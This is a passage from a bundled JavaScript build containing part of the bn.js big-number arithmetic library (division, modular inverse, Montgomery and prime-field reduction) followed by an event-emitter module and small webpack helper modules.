                        return this.clone().ishrn(bits);
                    }),
                    (BN.prototype.ushrn = function (bits) {
                        return this.clone().iushrn(bits);
                    }),
                    (BN.prototype.testn = function (bit) {
                        assert("number" == typeof bit && bit >= 0);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        return !(this.length <= s) && !!(this.words[s] & q);
                    }),
                    (BN.prototype.imaskn = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var r = bits % 26,
                            s = (bits - r) / 26;
                        if ((assert(0 === this.negative, "imaskn works only with positive numbers"), this.length <= s)) return this;
                        if ((0 !== r && s++, (this.length = Math.min(s, this.length)), 0 !== r)) {
                            var mask = 67108863 ^ ((67108863 >>> r) << r);
                            this.words[this.length - 1] &= mask;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.maskn = function (bits) {
                        return this.clone().imaskn(bits);
                    }),
                    (BN.prototype.iaddn = function (num) {
                        return (
                            assert("number" == typeof num),
                            assert(num < 67108864),
                            num < 0
                                ? this.isubn(-num)
                                : 0 !== this.negative
                                ? 1 === this.length && (0 | this.words[0]) < num
                                    ? ((this.words[0] = num - (0 | this.words[0])), (this.negative = 0), this)
                                    : ((this.negative = 0), this.isubn(num), (this.negative = 1), this)
                                : this._iaddn(num)
                        );
                    }),
                    (BN.prototype._iaddn = function (num) {
                        this.words[0] += num;
                        for (var i = 0; i < this.length && this.words[i] >= 67108864; i++) (this.words[i] -= 67108864), i === this.length - 1 ? (this.words[i + 1] = 1) : this.words[i + 1]++;
                        return (this.length = Math.max(this.length, i + 1)), this;
                    }),
                    (BN.prototype.isubn = function (num) {
                        if ((assert("number" == typeof num), assert(num < 67108864), num < 0)) return this.iaddn(-num);
                        if (0 !== this.negative) return (this.negative = 0), this.iaddn(num), (this.negative = 1), this;
                        if (((this.words[0] -= num), 1 === this.length && this.words[0] < 0)) (this.words[0] = -this.words[0]), (this.negative = 1);
                        else for (var i = 0; i < this.length && this.words[i] < 0; i++) (this.words[i] += 67108864), (this.words[i + 1] -= 1);
                        return this.strip();
                    }),
                    (BN.prototype.addn = function (num) {
                        return this.clone().iaddn(num);
                    }),
                    (BN.prototype.subn = function (num) {
                        return this.clone().isubn(num);
                    }),
                    (BN.prototype.iabs = function () {
                        return (this.negative = 0), this;
                    }),
                    (BN.prototype.abs = function () {
                        return this.clone().iabs();
                    }),
                    (BN.prototype._ishlnsubmul = function (num, mul, shift) {
                        var i,
                            w,
                            len = num.length + shift;
                        this._expand(len);
                        var carry = 0;
                        for (i = 0; i < num.length; i++) {
                            w = (0 | this.words[i + shift]) + carry;
                            var right = (0 | num.words[i]) * mul;
                            (carry = ((w -= 67108863 & right) >> 26) - ((right / 67108864) | 0)), (this.words[i + shift] = 67108863 & w);
                        }
                        for (; i < this.length - shift; i++) (carry = (w = (0 | this.words[i + shift]) + carry) >> 26), (this.words[i + shift] = 67108863 & w);
                        if (0 === carry) return this.strip();
                        for (assert(-1 === carry), carry = 0, i = 0; i < this.length; i++) (carry = (w = -(0 | this.words[i]) + carry) >> 26), (this.words[i] = 67108863 & w);
                        return (this.negative = 1), this.strip();
                    }),
                    (BN.prototype._wordDiv = function (num, mode) {
                        var shift = (this.length, num.length),
                            a = this.clone(),
                            b = num,
                            bhi = 0 | b.words[b.length - 1];
                        0 !== (shift = 26 - this._countBits(bhi)) && ((b = b.ushln(shift)), a.iushln(shift), (bhi = 0 | b.words[b.length - 1]));
                        var q,
                            m = a.length - b.length;
                        if ("mod" !== mode) {
                            ((q = new BN(null)).length = m + 1), (q.words = new Array(q.length));
                            for (var i = 0; i < q.length; i++) q.words[i] = 0;
                        }
                        var diff = a.clone()._ishlnsubmul(b, 1, m);
                        0 === diff.negative && ((a = diff), q && (q.words[m] = 1));
                        for (var j = m - 1; j >= 0; j--) {
                            var qj = 67108864 * (0 | a.words[b.length + j]) + (0 | a.words[b.length + j - 1]);
                            for (qj = Math.min((qj / bhi) | 0, 67108863), a._ishlnsubmul(b, qj, j); 0 !== a.negative; ) qj--, (a.negative = 0), a._ishlnsubmul(b, 1, j), a.isZero() || (a.negative ^= 1);
                            q && (q.words[j] = qj);
                        }
                        return q && q.strip(), a.strip(), "div" !== mode && 0 !== shift && a.iushrn(shift), { div: q || null, mod: a };
                    }),
                    (BN.prototype.divmod = function (num, mode, positive) {
                        return (
                            assert(!num.isZero()),
                            this.isZero()
                                ? { div: new BN(0), mod: new BN(0) }
                                : 0 !== this.negative && 0 === num.negative
                                ? ((res = this.neg().divmod(num, mode)), "mod" !== mode && (div = res.div.neg()), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.iadd(num)), { div: div, mod: mod })
                                : 0 === this.negative && 0 !== num.negative
                                ? ((res = this.divmod(num.neg(), mode)), "mod" !== mode && (div = res.div.neg()), { div: div, mod: res.mod })
                                : 0 != (this.negative & num.negative)
                                ? ((res = this.neg().divmod(num.neg(), mode)), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.isub(num)), { div: res.div, mod: mod })
                                : num.length > this.length || this.cmp(num) < 0
                                ? { div: new BN(0), mod: this }
                                : 1 === num.length
                                ? "div" === mode
                                    ? { div: this.divn(num.words[0]), mod: null }
                                    : "mod" === mode
                                    ? { div: null, mod: new BN(this.modn(num.words[0])) }
                                    : { div: this.divn(num.words[0]), mod: new BN(this.modn(num.words[0])) }
                                : this._wordDiv(num, mode)
                        );
                        var div, mod, res;
                    }),
                    (BN.prototype.div = function (num) {
                        return this.divmod(num, "div", !1).div;
                    }),
                    (BN.prototype.mod = function (num) {
                        return this.divmod(num, "mod", !1).mod;
                    }),
                    (BN.prototype.umod = function (num) {
                        return this.divmod(num, "mod", !0).mod;
                    }),
                    (BN.prototype.divRound = function (num) {
                        var dm = this.divmod(num);
                        if (dm.mod.isZero()) return dm.div;
                        var mod = 0 !== dm.div.negative ? dm.mod.isub(num) : dm.mod,
                            half = num.ushrn(1),
                            r2 = num.andln(1),
                            cmp = mod.cmp(half);
                        return cmp < 0 || (1 === r2 && 0 === cmp) ? dm.div : 0 !== dm.div.negative ? dm.div.isubn(1) : dm.div.iaddn(1);
                    }),
                    (BN.prototype.modn = function (num) {
                        assert(num <= 67108863);
                        for (var p = (1 << 26) % num, acc = 0, i = this.length - 1; i >= 0; i--) acc = (p * acc + (0 | this.words[i])) % num;
                        return acc;
                    }),
                    (BN.prototype.idivn = function (num) {
                        assert(num <= 67108863);
                        for (var carry = 0, i = this.length - 1; i >= 0; i--) {
                            var w = (0 | this.words[i]) + 67108864 * carry;
                            (this.words[i] = (w / num) | 0), (carry = w % num);
                        }
                        return this.strip();
                    }),
                    (BN.prototype.divn = function (num) {
                        return this.clone().idivn(num);
                    }),
                    (BN.prototype.egcd = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var x = this,
                            y = p.clone();
                        x = 0 !== x.negative ? x.umod(p) : x.clone();
                        for (var A = new BN(1), B = new BN(0), C = new BN(0), D = new BN(1), g = 0; x.isEven() && y.isEven(); ) x.iushrn(1), y.iushrn(1), ++g;
                        for (var yp = y.clone(), xp = x.clone(); !x.isZero(); ) {
                            for (var i = 0, im = 1; 0 == (x.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (x.iushrn(i); i-- > 0; ) (A.isOdd() || B.isOdd()) && (A.iadd(yp), B.isub(xp)), A.iushrn(1), B.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (y.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (y.iushrn(j); j-- > 0; ) (C.isOdd() || D.isOdd()) && (C.iadd(yp), D.isub(xp)), C.iushrn(1), D.iushrn(1);
                            x.cmp(y) >= 0 ? (x.isub(y), A.isub(C), B.isub(D)) : (y.isub(x), C.isub(A), D.isub(B));
                        }
                        return { a: C, b: D, gcd: y.iushln(g) };
                    }),
                    (BN.prototype._invmp = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var a = this,
                            b = p.clone();
                        a = 0 !== a.negative ? a.umod(p) : a.clone();
                        for (var res, x1 = new BN(1), x2 = new BN(0), delta = b.clone(); a.cmpn(1) > 0 && b.cmpn(1) > 0; ) {
                            for (var i = 0, im = 1; 0 == (a.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (a.iushrn(i); i-- > 0; ) x1.isOdd() && x1.iadd(delta), x1.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (b.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (b.iushrn(j); j-- > 0; ) x2.isOdd() && x2.iadd(delta), x2.iushrn(1);
                            a.cmp(b) >= 0 ? (a.isub(b), x1.isub(x2)) : (b.isub(a), x2.isub(x1));
                        }
                        return (res = 0 === a.cmpn(1) ? x1 : x2).cmpn(0) < 0 && res.iadd(p), res;
                    }),
                    (BN.prototype.gcd = function (num) {
                        if (this.isZero()) return num.abs();
                        if (num.isZero()) return this.abs();
                        var a = this.clone(),
                            b = num.clone();
                        (a.negative = 0), (b.negative = 0);
                        for (var shift = 0; a.isEven() && b.isEven(); shift++) a.iushrn(1), b.iushrn(1);
                        for (;;) {
                            for (; a.isEven(); ) a.iushrn(1);
                            for (; b.isEven(); ) b.iushrn(1);
                            var r = a.cmp(b);
                            if (r < 0) {
                                var t = a;
                                (a = b), (b = t);
                            } else if (0 === r || 0 === b.cmpn(1)) break;
                            a.isub(b);
                        }
                        return b.iushln(shift);
                    }),
                    (BN.prototype.invm = function (num) {
                        return this.egcd(num).a.umod(num);
                    }),
                    (BN.prototype.isEven = function () {
                        return 0 == (1 & this.words[0]);
                    }),
                    (BN.prototype.isOdd = function () {
                        return 1 == (1 & this.words[0]);
                    }),
                    (BN.prototype.andln = function (num) {
                        return this.words[0] & num;
                    }),
                    (BN.prototype.bincn = function (bit) {
                        assert("number" == typeof bit);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        if (this.length <= s) return this._expand(s + 1), (this.words[s] |= q), this;
                        for (var carry = q, i = s; 0 !== carry && i < this.length; i++) {
                            var w = 0 | this.words[i];
                            (carry = (w += carry) >>> 26), (w &= 67108863), (this.words[i] = w);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.isZero = function () {
                        return 1 === this.length && 0 === this.words[0];
                    }),
                    (BN.prototype.cmpn = function (num) {
                        var res,
                            negative = num < 0;
                        if (0 !== this.negative && !negative) return -1;
                        if (0 === this.negative && negative) return 1;
                        if ((this.strip(), this.length > 1)) res = 1;
                        else {
                            negative && (num = -num), assert(num <= 67108863, "Number is too big");
                            var w = 0 | this.words[0];
                            res = w === num ? 0 : w < num ? -1 : 1;
                        }
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.cmp = function (num) {
                        if (0 !== this.negative && 0 === num.negative) return -1;
                        if (0 === this.negative && 0 !== num.negative) return 1;
                        var res = this.ucmp(num);
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.ucmp = function (num) {
                        if (this.length > num.length) return 1;
                        if (this.length < num.length) return -1;
                        for (var res = 0, i = this.length - 1; i >= 0; i--) {
                            var a = 0 | this.words[i],
                                b = 0 | num.words[i];
                            if (a !== b) {
                                a < b ? (res = -1) : a > b && (res = 1);
                                break;
                            }
                        }
                        return res;
                    }),
                    (BN.prototype.gtn = function (num) {
                        return 1 === this.cmpn(num);
                    }),
                    (BN.prototype.gt = function (num) {
                        return 1 === this.cmp(num);
                    }),
                    (BN.prototype.gten = function (num) {
                        return this.cmpn(num) >= 0;
                    }),
                    (BN.prototype.gte = function (num) {
                        return this.cmp(num) >= 0;
                    }),
                    (BN.prototype.ltn = function (num) {
                        return -1 === this.cmpn(num);
                    }),
                    (BN.prototype.lt = function (num) {
                        return -1 === this.cmp(num);
                    }),
                    (BN.prototype.lten = function (num) {
                        return this.cmpn(num) <= 0;
                    }),
                    (BN.prototype.lte = function (num) {
                        return this.cmp(num) <= 0;
                    }),
                    (BN.prototype.eqn = function (num) {
                        return 0 === this.cmpn(num);
                    }),
                    (BN.prototype.eq = function (num) {
                        return 0 === this.cmp(num);
                    }),
                    (BN.red = function (num) {
                        return new Red(num);
                    }),
                    (BN.prototype.toRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), assert(0 === this.negative, "red works only with positives"), ctx.convertTo(this)._forceRed(ctx);
                    }),
                    (BN.prototype.fromRed = function () {
                        return assert(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this);
                    }),
                    (BN.prototype._forceRed = function (ctx) {
                        return (this.red = ctx), this;
                    }),
                    (BN.prototype.forceRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), this._forceRed(ctx);
                    }),
                    (BN.prototype.redAdd = function (num) {
                        return assert(this.red, "redAdd works only with red numbers"), this.red.add(this, num);
                    }),
                    (BN.prototype.redIAdd = function (num) {
                        return assert(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, num);
                    }),
                    (BN.prototype.redSub = function (num) {
                        return assert(this.red, "redSub works only with red numbers"), this.red.sub(this, num);
                    }),
                    (BN.prototype.redISub = function (num) {
                        return assert(this.red, "redISub works only with red numbers"), this.red.isub(this, num);
                    }),
                    (BN.prototype.redShl = function (num) {
                        return assert(this.red, "redShl works only with red numbers"), this.red.shl(this, num);
                    }),
                    (BN.prototype.redMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.mul(this, num);
                    }),
                    (BN.prototype.redIMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.imul(this, num);
                    }),
                    (BN.prototype.redSqr = function () {
                        return assert(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this);
                    }),
                    (BN.prototype.redISqr = function () {
                        return assert(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this);
                    }),
                    (BN.prototype.redSqrt = function () {
                        return assert(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this);
                    }),
                    (BN.prototype.redInvm = function () {
                        return assert(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this);
                    }),
                    (BN.prototype.redNeg = function () {
                        return assert(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this);
                    }),
                    (BN.prototype.redPow = function (num) {
                        return assert(this.red && !num.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, num);
                    });
                var primes = { k256: null, p224: null, p192: null, p25519: null };
                function MPrime(name, p) {
                    (this.name = name), (this.p = new BN(p, 16)), (this.n = this.p.bitLength()), (this.k = new BN(1).iushln(this.n).isub(this.p)), (this.tmp = this._tmp());
                }
                function K256() {
                    MPrime.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f");
                }
                function P224() {
                    MPrime.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001");
                }
                function P192() {
                    MPrime.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff");
                }
                function P25519() {
                    MPrime.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed");
                }
                function Red(m) {
                    if ("string" == typeof m) {
                        var prime = BN._prime(m);
                        (this.m = prime.p), (this.prime = prime);
                    } else assert(m.gtn(1), "modulus must be greater than 1"), (this.m = m), (this.prime = null);
                }
                function Mont(m) {
                    Red.call(this, m),
                        (this.shift = this.m.bitLength()),
                        this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
                        (this.r = new BN(1).iushln(this.shift)),
                        (this.r2 = this.imod(this.r.sqr())),
                        (this.rinv = this.r._invmp(this.m)),
                        (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
                        (this.minv = this.minv.umod(this.r)),
                        (this.minv = this.r.sub(this.minv));
                }
                (MPrime.prototype._tmp = function () {
                    var tmp = new BN(null);
                    return (tmp.words = new Array(Math.ceil(this.n / 13))), tmp;
                }),
                    (MPrime.prototype.ireduce = function (num) {
                        var rlen,
                            r = num;
                        do {
                            this.split(r, this.tmp), (rlen = (r = (r = this.imulK(r)).iadd(this.tmp)).bitLength());
                        } while (rlen > this.n);
                        var cmp = rlen < this.n ? -1 : r.ucmp(this.p);
                        return 0 === cmp ? ((r.words[0] = 0), (r.length = 1)) : cmp > 0 ? r.isub(this.p) : void 0 !== r.strip ? r.strip() : r._strip(), r;
                    }),
                    (MPrime.prototype.split = function (input, out) {
                        input.iushrn(this.n, 0, out);
                    }),
                    (MPrime.prototype.imulK = function (num) {
                        return num.imul(this.k);
                    }),
                    inherits(K256, MPrime),
                    (K256.prototype.split = function (input, output) {
                        for (var outLen = Math.min(input.length, 9), i = 0; i < outLen; i++) output.words[i] = input.words[i];
                        if (((output.length = outLen), input.length <= 9)) return (input.words[0] = 0), void (input.length = 1);
                        var prev = input.words[9];
                        for (output.words[output.length++] = 4194303 & prev, i = 10; i < input.length; i++) {
                            var next = 0 | input.words[i];
                            (input.words[i - 10] = ((4194303 & next) << 4) | (prev >>> 22)), (prev = next);
                        }
                        (prev >>>= 22), (input.words[i - 10] = prev), 0 === prev && input.length > 10 ? (input.length -= 10) : (input.length -= 9);
                    }),
                    (K256.prototype.imulK = function (num) {
                        (num.words[num.length] = 0), (num.words[num.length + 1] = 0), (num.length += 2);
                        for (var lo = 0, i = 0; i < num.length; i++) {
                            var w = 0 | num.words[i];
                            (lo += 977 * w), (num.words[i] = 67108863 & lo), (lo = 64 * w + ((lo / 67108864) | 0));
                        }
                        return 0 === num.words[num.length - 1] && (num.length--, 0 === num.words[num.length - 1] && num.length--), num;
                    }),
                    inherits(P224, MPrime),
                    inherits(P192, MPrime),
                    inherits(P25519, MPrime),
                    (P25519.prototype.imulK = function (num) {
                        for (var carry = 0, i = 0; i < num.length; i++) {
                            var hi = 19 * (0 | num.words[i]) + carry,
                                lo = 67108863 & hi;
                            (hi >>>= 26), (num.words[i] = lo), (carry = hi);
                        }
                        return 0 !== carry && (num.words[num.length++] = carry), num;
                    }),
                    (BN._prime = function (name) {
                        if (primes[name]) return primes[name];
                        var prime;
                        if ("k256" === name) prime = new K256();
                        else if ("p224" === name) prime = new P224();
                        else if ("p192" === name) prime = new P192();
                        else {
                            if ("p25519" !== name) throw new Error("Unknown prime " + name);
                            prime = new P25519();
                        }
                        return (primes[name] = prime), prime;
                    }),
                    (Red.prototype._verify1 = function (a) {
                        assert(0 === a.negative, "red works only with positives"), assert(a.red, "red works only with red numbers");
                    }),
                    (Red.prototype._verify2 = function (a, b) {
                        assert(0 == (a.negative | b.negative), "red works only with positives"), assert(a.red && a.red === b.red, "red works only with red numbers");
                    }),
                    (Red.prototype.imod = function (a) {
                        return this.prime ? this.prime.ireduce(a)._forceRed(this) : a.umod(this.m)._forceRed(this);
                    }),
                    (Red.prototype.neg = function (a) {
                        return a.isZero() ? a.clone() : this.m.sub(a)._forceRed(this);
                    }),
                    (Red.prototype.add = function (a, b) {
                        this._verify2(a, b);
                        var res = a.add(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.iadd = function (a, b) {
                        this._verify2(a, b);
                        var res = a.iadd(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res;
                    }),
                    (Red.prototype.sub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.sub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.isub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.isub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res;
                    }),
                    (Red.prototype.shl = function (a, num) {
                        return this._verify1(a), this.imod(a.ushln(num));
                    }),
                    (Red.prototype.imul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.imul(b));
                    }),
                    (Red.prototype.mul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.mul(b));
                    }),
                    (Red.prototype.isqr = function (a) {
                        return this.imul(a, a.clone());
                    }),
                    (Red.prototype.sqr = function (a) {
                        return this.mul(a, a);
                    }),
                    (Red.prototype.sqrt = function (a) {
                        if (a.isZero()) return a.clone();
                        var mod3 = this.m.andln(3);
                        if ((assert(mod3 % 2 == 1), 3 === mod3)) {
                            var pow = this.m.add(new BN(1)).iushrn(2);
                            return this.pow(a, pow);
                        }
                        for (var q = this.m.subn(1), s = 0; !q.isZero() && 0 === q.andln(1); ) s++, q.iushrn(1);
                        assert(!q.isZero());
                        var one = new BN(1).toRed(this),
                            nOne = one.redNeg(),
                            lpow = this.m.subn(1).iushrn(1),
                            z = this.m.bitLength();
                        for (z = new BN(2 * z * z).toRed(this); 0 !== this.pow(z, lpow).cmp(nOne); ) z.redIAdd(nOne);
                        for (var c = this.pow(z, q), r = this.pow(a, q.addn(1).iushrn(1)), t = this.pow(a, q), m = s; 0 !== t.cmp(one); ) {
                            for (var tmp = t, i = 0; 0 !== tmp.cmp(one); i++) tmp = tmp.redSqr();
                            assert(i < m);
                            var b = this.pow(c, new BN(1).iushln(m - i - 1));
                            (r = r.redMul(b)), (c = b.redSqr()), (t = t.redMul(c)), (m = i);
                        }
                        return r;
                    }),
                    (Red.prototype.invm = function (a) {
                        var inv = a._invmp(this.m);
                        return 0 !== inv.negative ? ((inv.negative = 0), this.imod(inv).redNeg()) : this.imod(inv);
                    }),
                    (Red.prototype.pow = function (a, num) {
                        if (num.isZero()) return new BN(1).toRed(this);
                        if (0 === num.cmpn(1)) return a.clone();
                        var wnd = new Array(16);
                        (wnd[0] = new BN(1).toRed(this)), (wnd[1] = a);
                        for (var i = 2; i < wnd.length; i++) wnd[i] = this.mul(wnd[i - 1], a);
                        var res = wnd[0],
                            current = 0,
                            currentLen = 0,
                            start = num.bitLength() % 26;
                        for (0 === start && (start = 26), i = num.length - 1; i >= 0; i--) {
                            for (var word = num.words[i], j = start - 1; j >= 0; j--) {
                                var bit = (word >> j) & 1;
                                res !== wnd[0] && (res = this.sqr(res)),
                                    0 !== bit || 0 !== current ? ((current <<= 1), (current |= bit), (4 === ++currentLen || (0 === i && 0 === j)) && ((res = this.mul(res, wnd[current])), (currentLen = 0), (current = 0))) : (currentLen = 0);
                            }
                            start = 26;
                        }
                        return res;
                    }),
                    (Red.prototype.convertTo = function (num) {
                        var r = num.umod(this.m);
                        return r === num ? r.clone() : r;
                    }),
                    (Red.prototype.convertFrom = function (num) {
                        var res = num.clone();
                        return (res.red = null), res;
                    }),
                    (BN.mont = function (num) {
                        return new Mont(num);
                    }),
                    inherits(Mont, Red),
                    (Mont.prototype.convertTo = function (num) {
                        return this.imod(num.ushln(this.shift));
                    }),
                    (Mont.prototype.convertFrom = function (num) {
                        var r = this.imod(num.mul(this.rinv));
                        return (r.red = null), r;
                    }),
                    (Mont.prototype.imul = function (a, b) {
                        if (a.isZero() || b.isZero()) return (a.words[0] = 0), (a.length = 1), a;
                        var t = a.imul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.mul = function (a, b) {
                        if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);
                        var t = a.mul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.invm = function (a) {
                        return this.imod(a._invmp(this.m).mul(this.r2))._forceRed(this);
                    });
            })(module, this);
        }.call(this, __webpack_require__(23)(module)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var has = Object.prototype.hasOwnProperty,
            prefix = "~";
        function Events() {}
        function EE(fn, context, once) {
            (this.fn = fn), (this.context = context), (this.once = once || !1);
        }
        function addListener(emitter, event, fn, context, once) {
            if ("function" != typeof fn) throw new TypeError("The listener must be a function");
            var listener = new EE(fn, context || emitter, once),
                evt = prefix ? prefix + event : event;
            return emitter._events[evt] ? (emitter._events[evt].fn ? (emitter._events[evt] = [emitter._events[evt], listener]) : emitter._events[evt].push(listener)) : ((emitter._events[evt] = listener), emitter._eventsCount++), emitter;
        }
        function clearEvent(emitter, evt) {
            0 == --emitter._eventsCount ? (emitter._events = new Events()) : delete emitter._events[evt];
        }
        function EventEmitter() {
            (this._events = new Events()), (this._eventsCount = 0);
        }
        Object.create && ((Events.prototype = Object.create(null)), new Events().__proto__ || (prefix = !1)),
            (EventEmitter.prototype.eventNames = function () {
                var events,
                    name,
                    names = [];
                if (0 === this._eventsCount) return names;
                for (name in (events = this._events)) has.call(events, name) && names.push(prefix ? name.slice(1) : name);
                return Object.getOwnPropertySymbols ? names.concat(Object.getOwnPropertySymbols(events)) : names;
            }),
            (EventEmitter.prototype.listeners = function (event) {
                var evt = prefix ? prefix + event : event,
                    handlers = this._events[evt];
                if (!handlers) return [];
                if (handlers.fn) return [handlers.fn];
                for (var i = 0, l = handlers.length, ee = new Array(l); i < l; i++) ee[i] = handlers[i].fn;
                return ee;
            }),
            (EventEmitter.prototype.listenerCount = function (event) {
                var evt = prefix ? prefix + event : event,
                    listeners = this._events[evt];
                return listeners ? (listeners.fn ? 1 : listeners.length) : 0;
            }),
            (EventEmitter.prototype.emit = function (event, a1, a2, a3, a4, a5) {
                var evt = prefix ? prefix + event : event;
                if (!this._events[evt]) return !1;
                var args,
                    i,
                    listeners = this._events[evt],
                    len = arguments.length;
                if (listeners.fn) {
                    switch ((listeners.once && this.removeListener(event, listeners.fn, void 0, !0), len)) {
                        case 1:
                            return listeners.fn.call(listeners.context), !0;
                        case 2:
                            return listeners.fn.call(listeners.context, a1), !0;
                        case 3:
                            return listeners.fn.call(listeners.context, a1, a2), !0;
                        case 4:
                            return listeners.fn.call(listeners.context, a1, a2, a3), !0;
                        case 5:
                            return listeners.fn.call(listeners.context, a1, a2, a3, a4), !0;
                        case 6:
                            return listeners.fn.call(listeners.context, a1, a2, a3, a4, a5), !0;
                    }
                    for (i = 1, args = new Array(len - 1); i < len; i++) args[i - 1] = arguments[i];
                    listeners.fn.apply(listeners.context, args);
                } else {
                    var j,
                        length = listeners.length;
                    for (i = 0; i < length; i++)
                        switch ((listeners[i].once && this.removeListener(event, listeners[i].fn, void 0, !0), len)) {
                            case 1:
                                listeners[i].fn.call(listeners[i].context);
                                break;
                            case 2:
                                listeners[i].fn.call(listeners[i].context, a1);
                                break;
                            case 3:
                                listeners[i].fn.call(listeners[i].context, a1, a2);
                                break;
                            case 4:
                                listeners[i].fn.call(listeners[i].context, a1, a2, a3);
                                break;
                            default:
                                if (!args) for (j = 1, args = new Array(len - 1); j < len; j++) args[j - 1] = arguments[j];
                                listeners[i].fn.apply(listeners[i].context, args);
                        }
                }
                return !0;
            }),
            (EventEmitter.prototype.on = function (event, fn, context) {
                return addListener(this, event, fn, context, !1);
            }),
            (EventEmitter.prototype.once = function (event, fn, context) {
                return addListener(this, event, fn, context, !0);
            }),
            (EventEmitter.prototype.removeListener = function (event, fn, context, once) {
                var evt = prefix ? prefix + event : event;
                if (!this._events[evt]) return this;
                if (!fn) return clearEvent(this, evt), this;
                var listeners = this._events[evt];
                if (listeners.fn) listeners.fn !== fn || (once && !listeners.once) || (context && listeners.context !== context) || clearEvent(this, evt);
                else {
                    for (var i = 0, events = [], length = listeners.length; i < length; i++) (listeners[i].fn !== fn || (once && !listeners[i].once) || (context && listeners[i].context !== context)) && events.push(listeners[i]);
                    events.length ? (this._events[evt] = 1 === events.length ? events[0] : events) : clearEvent(this, evt);
                }
                return this;
            }),
            (EventEmitter.prototype.removeAllListeners = function (event) {
                var evt;
                return event ? ((evt = prefix ? prefix + event : event), this._events[evt] && clearEvent(this, evt)) : ((this._events = new Events()), (this._eventsCount = 0)), this;
            }),
            (EventEmitter.prototype.off = EventEmitter.prototype.removeListener),
            (EventEmitter.prototype.addListener = EventEmitter.prototype.on),
            (EventEmitter.prefixed = prefix),
            (EventEmitter.EventEmitter = EventEmitter),
            (module.exports = EventEmitter);
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        (function (global, module) {
            var root,
                _ponyfill_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(137);
            root = "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== global ? global : module;
            var result = Object(_ponyfill_js__WEBPACK_IMPORTED_MODULE_0__.a)(root);
            __webpack_exports__.a = result;
        }.call(this, __webpack_require__(8), __webpack_require__(160)(module)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = __webpack_require__(168);
    },
    function (module, exports, __webpack_require__) {
        var objectWithoutPropertiesLoose = __webpack_require__(174);
        (module.exports = function (source, excluded) {
            if (null == source) return {};
            var key,
                i,
                target = objectWithoutPropertiesLoose(source, excluded);
            if (Object.getOwnPropertySymbols) {
                var sourceSymbolKeys = Object.getOwnPropertySymbols(source);
                for (i = 0; i < sourceSymbolKeys.length; i++) (key = sourceSymbolKeys[i]), excluded.indexOf(key) >= 0 || (Object.prototype.propertyIsEnumerable.call(source, key) && (target[key] = source[key]));
            }
            return target;
        }),
            (module.exports.__esModule = !0),
            (module.exports.default = module.exports);
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        (function (global) {
            var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(0),
                react__WEBPACK_IMPORTED_MODULE_0___default = __webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_0__),
